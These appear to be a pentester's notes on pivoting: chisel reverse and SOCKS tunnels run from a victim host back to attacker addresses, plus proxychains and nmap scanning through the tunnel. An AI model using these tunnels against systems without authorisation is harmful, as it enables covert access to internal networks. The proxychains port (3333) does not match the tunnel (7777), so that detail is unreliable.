# Pivoting 

## Readme

https://cheatsheet.haax.fr/network/pivot_techniques/
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

##  Proxies

### Forward proxy

some service is listening at victim and connection is incomming from atacker 


### static  forwarding


 <local-interface>:<local-port>:<remote-host>:<remote-port>

  which does  port forwarding, sharing 
  
   
clients <local-interface>:<local-port>
on remote server's <remote-host>:<remote-port>

Set up new server (this time non socks) on attacker

./chisel server --port 9902

Activate client on victims host

./chisel client 10.10.14.xxx:9902 192.168.1.15:8888:127.0.0.1:443 

So now attacker can access victims port external 8888 on it localhost port 443

### Reverse proxy

some service is listening at attacker AND connection is incomming from the victim outside firewall



#### static reverse

Attacker (1.1.1.1:8000) --------> Victim Pivot (client forwards input from attacker to next victim ) --------> Next Victim (3.3.3.4)

./chisel server -p 8000 --reverse on local 
./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80 on the target. 

This will open a listener on port 80 on my Kali box, and any connections to that port will be forwarded to the target, which will pass them to port 80 on 3.3.3.4.

#### Dynamic reverse forwarding

* In this scenario all ports from the victim pivot point aer redirected to attacker so attacker can access Next Victim, which
would be othervise not visible for his network adapter

./chisel server -p 3333 --reverse --socks5

./chisel_lin client 172.16.40.5:3333 R:7777:socks

sudo vim /etc/proxychains4.conf

socks5 127.0.0.1 3333

proxychains nmap -F 10.185.10.0/24




## scanning with nmap

* run for getting open ports
`seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n`

* remove bad lines and save to log file
`grep '/open/' 10.42.42.2 | uniq > openports.log`

* then scan each port separately

